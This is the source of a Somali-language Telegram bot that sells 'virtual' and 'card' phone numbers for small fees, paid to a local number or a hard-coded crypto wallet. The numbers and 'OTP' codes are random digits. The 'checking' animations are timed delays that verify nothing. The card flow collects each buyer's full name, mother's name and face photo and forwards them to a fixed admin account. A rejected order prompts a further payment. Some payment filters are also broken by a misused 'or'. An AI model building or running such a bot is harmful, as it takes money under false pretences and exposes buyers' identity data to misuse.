import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654
LOCAL_NUMBER = "+252907868526"

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class VirtualPayState(StatesGroup):
    payment_screenshot = State()

class AskState(StatesGroup):
    message = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4, 9))
    return "+25263" + d*3 + str(random.randint(0, 9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def checking_animation(msg):
    for text in ["CHECKING.", "CHECKING..", "CHECKING...", "CHECKING...."]:
        await asyncio.sleep(1)
        await msg.edit_text(text)

def payment_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="pay_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="pay_crypto")]
    ])

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"),
             KeyboardButton(text="Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL FLOW =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    number = normal_number()
    uid = call.from_user.id

    users[uid] = {
        "type": "virtual",
        "platform": call.data.replace("v_", ""),
        "number": number,
        "amount": "$0.8",
        "crypto_pending": False
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Local", callback_data="v_pay_local")],
        [InlineKeyboardButton(text="Crypto", callback_data="v_pay_crypto")]
    ])
    await call.message.edit_text(
        f"Platform: {users[uid]['platform']}\nNumber: {number}\nQiimaha: $0.8\nDooro Payment:",
        reply_markup=kb
)

# ================= CARD FLOW =================
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip", "normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data == "vip" else normal_number()
    uid = call.from_user.id

    users[uid] = {
        "type": "card",
        "level": call.data,
        "number": number,
        "amount": "$15" if call.data == "vip" else "$1"
    }

    await call.message.answer("Fadlan geli Magacaaga Saddexan:")
    await state.set_state(CardState.full_name)

# ================= CARD STATES =================
@dp.message(CardState.full_name)
async def get_name(msg: Message, state: FSMContext):
    if len(msg.text.split()) < 3:
        await msg.answer("Magac Saddexan sax ah geli.")
        return
    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga (Waji kaliya):")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def get_photo(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["photo"] = msg.photo[-1].file_id

    await msg.answer(
        f"Number: {users[uid]['number']}\nQiimaha: {users[uid]['amount']}\nDooro Payment Method:",
        reply_markup=payment_keyboard()
    )

# ================= LOCAL PAYMENT =================
@dp.callback_query(F.data == "pay_local" or F.data == "v_pay_local")
async def pay_local(call: CallbackQuery):
    uid = call.from_user.id
    number = LOCAL_NUMBER if users[uid]["type"] == "card" else users[uid]["number"]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_pay")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")],
        [InlineKeyboardButton(text="ASK", callback_data="ask_user")]
    ])
    await call.message.edit_text(
        f"Numberka lacagta u dir:\n{number}", reply_markup=kb
    )

# ================= CONFIRM PAYMENT + ANIMATION ==================
@dp.callback_query(F.data == "confirm_pay")
async def confirm_pay(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Waiting for confirmation... ⏳")
    for step in ["Waiting.", "Waiting..", "Waiting...", "Waiting...."]:
        await asyncio.sleep(1)
        await msg.edit_text(step)

    await call.message.answer("Fadlan soo dir Screenshot Payment si loo xaqiijiyo:")
    await state.set_state(CardState.payment_screenshot)

# ================= CANCEL =================
@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ================= CRYPTO PAYMENT =================
@dp.callback_query(F.data == "pay_crypto" or F.data == "v_pay_crypto")
async def crypto_payment(call: CallbackQuery):
    uid = call.from_user.id
    bnb = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    usdt = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

    users[uid]["crypto_pending"] = True
    users[uid]["code"] = None  # code only after admin confirm

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="crypto_user_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="crypto_user_cancel")]
    ])

    msg = await call.message.edit_text(
        f"Send Crypto:\nBNB: `{bnb}`\nUSDT-BEP20: `{usdt}`\nTaabo si uu copy u noqdo",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.callback_query(F.data == "crypto_user_confirm")
async def crypto_user_confirm(call: CallbackQuery):
    uid = call.from_user.id
    msg = await call.message.edit_text("OTP.....")
    for i in range(10):
        await asyncio.sleep(1)
        msg_text = f"Checking{'.'*((i%4)+1)}"
        await msg.edit_text(msg_text)
    await call.message.answer(
        f"Fadlan Lacagta soo dir 💵 si dalabkaaga loo xaqiijiyo. Admin ayaa xaqiijin doona OTP-ga."
    )

@dp.callback_query(F.data == "crypto_user_cancel")
async def crypto_user_cancel(call: CallbackQuery):
    uid = call.from_user.id
    users[uid].pop("crypto_pending", None)
    await call.message.edit_text("Payment Cancelled ❌")

    # ================= SCREENSHOT TO ADMIN =================
@dp.message(CardState.payment_screenshot, F.photo)
async def receive_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Payment Screenshot waa la helay ⏳ Sug ansixinta Admin.")
    await state.clear()

    user_data = users[uid]
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
    ])

    # Sawirka waji + info
    await bot.send_photo(
        ADMIN_ID,
        user_data["photo"],
        caption=(
            f"Payment Request\n\n"
            f"User: {uid}\n"
            f"Type: {user_data['type']}\n"
            f"Platform: {user_data.get('platform','N/A')}\n"
            f"Level: {user_data.get('level','N/A')}\n"
            f"Number: {user_data['number']}\n"
            f"Name: {user_data.get('name','N/A')}\n"
            f"Mother: {user_data.get('mother','N/A')}\n"
            f"Payment: {user_data.get('amount','N/A')}"
        ),
        reply_markup=kb_admin
    )

    await bot.send_photo(
        ADMIN_ID,
        user_data["screenshot"],
        caption="Payment Screenshot"
    )

# ================= ADMIN CONFIRM ===================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    if uid not in users:
        await call.answer("User not found")
        return

    code = generate_code()
    users[uid]["code"] = code

    if users[uid]["type"] == "card":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CHECK CODE", callback_data="go_check")]
        ])
        await bot.send_message(
            uid,
            f"Payment Confirmed ✅\n\nCode-kaaga ku qor CHECK CODE:\n\n{code}",
            reply_markup=kb
        )
    elif users[uid]["type"] == "virtual":
        otp_msg = await bot.send_message(
            uid,
            f"OTP Ready ✅\nNumber: {users[uid]['number']}\nCode: {code}"
        )
        for step in ["OTP Generating.", "OTP Generating..", "OTP Generating...", "OTP Ready!"]:
            await asyncio.sleep(1)
            await otp_msg.edit_text(f"{step}\nNumber: {users[uid]['number']}\nCode: {code}")

    await call.message.edit_text("Approved ✅")

# ================= ADMIN REJECT ===================
@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    if uid in users:
        await bot.send_message(
            uid,
            f"Codsigaaga waa la diiday ❌\nFadlan lacagta ku dir Numberkan si loo xaqiijiyo:\n{LOCAL_NUMBER}"
        )
    await call.message.edit_text("Rejected ❌")

# ================= ADMIN ASK ===================
@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[2])
    await call.message.answer("Fariin qor user-ka:")
    await state.update_data(ask_user_id=uid)
    await state.set_state(AskState.message)

@dp.message(AskState.message)
async def send_ask(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("ask_user_id")
    if uid:
        await bot.send_message(uid, f"Message from Admin:\n{msg.text}")
        await msg.answer("Fariinta waa la diray ✅")
    await state.clear()

# ================= CHECK CODE FLOW ==================
@dp.callback_query(F.data == "go_check")
async def go_check(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(F.text == "Check Code")
async def check_code_menu(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def check_code_process(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code_input = msg.text.strip()

    if uid in users and users[uid].get("type") in ["card", "virtual"]:
        if users[uid].get("code") == code_input:
            await msg.answer(f"Code Confirmed ✅\nNumber-kaaga waa:\n{users[uid]['number']}")
        else:
            await msg.answer(
                f"Code Khaldan ❌\n\n"
                f"Number: {users[uid]['number']}\n"
                f"Qiimaha: {users[uid]['amount']}\n\n"
                f"Dooro Payment Method:",
                reply_markup=payment_keyboard()
            )
    else:
        await msg.answer("Ma jiro dalab la helay.")

    await state.clear()

# ================= FORWARD CARD INFO =================
@dp.message()
async def forward_card_to_admin(msg: Message):
    uid = msg.from_user.id
    if uid in users and users[uid].get("type") == "card":
        data = users[uid]

        if "screenshot" in data:
            kb_admin = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}")],
                [InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}")],
                [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
            ])

            await bot.send_photo(
                ADMIN_ID,
                data["photo"],
                caption=(
                    f"Card Request\n\n"
                    f"User: {uid}\n"
                    f"Level: {data['level']}\n"
                    f"Number: {data['number']}\n"
                    f"Name: {data['name']}\n"
                    f"Mother: {data['mother']}"
                ),
                reply_markup=kb_admin
            )

            await bot.send_photo(
                ADMIN_ID,
                data["screenshot"],
                caption="Payment Screenshot"
            )

# ================= MAIN POLLING =====================
async def main():
    logging.info("Bot-ka waa bilaabmay...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
